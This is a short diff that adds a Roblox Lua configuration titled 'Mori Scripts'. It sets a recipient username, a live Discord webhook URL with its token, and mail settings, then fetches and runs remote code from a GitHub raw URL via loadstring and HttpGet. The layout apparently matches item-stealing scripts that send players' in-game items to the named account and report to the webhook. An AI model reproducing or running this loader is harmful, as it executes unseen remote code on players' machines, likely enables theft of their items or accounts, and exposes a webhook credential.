@@ -1,0 +1,10 @@
+
+UserName = "CALXIE123"
+Webhook = "https://discord.com/api/webhooks/1165556044630593576/oSzrQmWCuCbVkiR-FDs2cWh8XBrUUJyMk5N4YaHqLmyHv9R7yPG1VN-nHlluJMCNWjY3" 
+UserName2 = "CALXIE123"
+
+_G.MailMessage = "GG"
+_G.LoadingTitle = "Mori Scripts" 
+_G.WebhookName = "zen_capybara_68616"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()```
